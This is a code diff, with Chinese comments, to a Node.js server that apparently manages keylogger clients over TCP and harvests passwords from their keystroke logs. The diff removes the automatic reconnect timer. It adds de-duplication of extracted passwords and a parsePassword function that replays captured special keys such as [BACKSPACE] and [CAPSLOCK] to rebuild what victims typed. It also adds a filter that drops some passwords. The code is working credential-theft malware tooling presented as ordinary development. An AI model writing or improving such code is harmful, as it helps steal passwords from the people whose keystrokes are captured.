@@ -491,8 +491,6 @@ class ClientManager {
         this.webClients = new Set();
         this.tcpServer = null;
         this.heartbeatTimer = null;
-        this.reconnectTimer = null;
-        this.reconnectQueue = new Set();
         this.reconnectLimit = pLimit(CONFIG.maxConcurrentReconnects);
         this.logger = logger.child({ module: 'ClientManager' });
     }
@@ -504,7 +502,6 @@ class ClientManager {
         this.startTcpServer();
         this.startHeartbeat();
         await this.connectAllKnownClients();
-        this.startReconnectTimer();
     }
 
     startTcpServer() {
@@ -689,30 +686,11 @@ class ClientManager {
         this.logger.info('已知客户端连接尝试完成');
     }
 
-    startReconnectTimer() {
-        this.reconnectTimer = setInterval(() => {
-            this.reconnectOfflineClients();
-        }, CONFIG.reconnectInterval);
-    }
 
-    async reconnectOfflineClients() {
-        this.logger.info('定时检查离线客户端...');
-        const offlineList = [];
-        for (const [clientId, info] of this.knownClients.entries()) {
-            const client = this.clients.get(clientId);
-            if (!client || client.status === 'offline') {
-                offlineList.push(clientId);
-            }
-        }
-        const tasks = offlineList.map(clientId => this.reconnectLimit(() => this.reconnectSingleClient(clientId)));
-        await Promise.allSettled(tasks);
-    }
+
+
 
     async reconnectSingleClient(clientId) {
-        if (this.reconnectQueue.has(clientId)) {
-            return;
-        }
-        this.reconnectQueue.add(clientId);
         try {
             const info = this.knownClients.get(clientId);
             if (!info) {
@@ -728,8 +706,6 @@ class ClientManager {
             }
         } catch (e) {
             this.logger.error(`重连异常: ${clientId}`, { error: e.message });
-        } finally {
-            this.reconnectQueue.delete(clientId);
         }
     }
 
@@ -1215,9 +1191,24 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
             return res.json({ success: true, count: 0 });
         }
         
+        // 去重：根据密码内容去重
+        const uniquePasswords = [];
+        const seenPasswords = new Set();
+        
+        for (const item of extractedPasswords) {
+            if (!seenPasswords.has(item.password)) {
+                seenPasswords.add(item.password);
+                uniquePasswords.push(item);
+            }
+        }
+        
+        if (uniquePasswords.length === 0) {
+            return res.json({ success: true, count: 0 });
+        }
+        
         // 保存提取结果到本地文件
         const resultFilename = 'extracted_passwords.txt';
-        const resultContent = extractedPasswords.map((item, index) => {
+        const resultContent = uniquePasswords.map((item, index) => {
             return `${index + 1}. 来自: ${item.file}\n时间: ${item.timestamp}\n内容: ${item.password}\n`;
         }).join('\n');
         
@@ -1237,7 +1228,7 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         
         res.json({ 
             success: true, 
-            count: extractedPasswords.length 
+            count: uniquePasswords.length 
         });
     } catch (error) {
         logger.error('提取密码失败', { error: error.message });
@@ -1266,6 +1257,63 @@ app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
         res.status(500).send('查看提取结果失败');
     }
 }));
+
+// 解析包含特殊键的密码字符串
+function parsePassword(password) {
+    let result = '';
+    let capsLock = false;
+    let i = 0;
+    
+    while (i < password.length) {
+        if (password[i] === '[') {
+            // 查找特殊键的结束位置
+            const endIndex = password.indexOf(']', i);
+            if (endIndex !== -1) {
+                const specialKey = password.substring(i + 1, endIndex);
+                
+                switch (specialKey) {
+                    case 'BACKSPACE':
+                        // 删除前一个字符
+                        result = result.slice(0, -1);
+                        break;
+                    case 'CAPSLOCK':
+                        // 切换大小写状态
+                        capsLock = !capsLock;
+                        break;
+                    case 'TAB':
+                        // 替换为空格
+                        result += ' ';
+                        break;
+                    case 'LSHIFT':
+                    case 'RSHIFT':
+                        // 暂时忽略Shift键，因为需要更复杂的上下文处理
+                        break;
+                    default:
+                        // 其他特殊键，暂时忽略
+                        break;
+                }
+                
+                i = endIndex + 1;
+            } else {
+                // 没有找到结束的 ]，当作普通字符处理
+                result += password[i];
+                i++;
+            }
+        } else {
+            // 普通字符，根据当前大小写状态处理
+            let char = password[i];
+            if (capsLock) {
+                char = char.toUpperCase();
+            } else {
+                char = char.toLowerCase();
+            }
+            result += char;
+            i++;
+        }
+    }
+    
+    return result;
+}
 
 // 从日志内容中提取密码
 function extractPasswordsFromLog(content, filename) {
@@ -1297,12 +1345,21 @@ function extractPasswordsFromLog(content, filename) {
                 j++;
             }
             
-            // 如果有密码行，将它们合并为一个条目
+            // 如果有密码行，将它们合并为一个条目，并解析特殊键
             if (passwordLines.length > 0) {
+                const rawPassword = passwordLines.join('\n');
+                const parsedPassword = parsePassword(rawPassword);
+                
+                // 过滤不需要的密码
+                const lowerParsedPassword = parsedPassword.toLowerCase();
+                if (lowerParsedPassword.includes('404-passwordnotfound') || lowerParsedPassword.includes('adm1n5')) {
+                    continue;
+                }
+                
                 passwords.push({
                     file: filename,
                     timestamp: timestamp,
-                    password: passwordLines.join('\n')
+                    password: parsedPassword
                 });
             }
         }
@@ -1335,7 +1392,6 @@ async function shutdown() {
     shuttingDown = true;
     logger.info('开始关机...');
     clearInterval(clientManager.heartbeatTimer);
-    clearInterval(clientManager.reconnectTimer);
 
     if (clientManager.tcpServer) {
         clientManager.tcpServer.close();
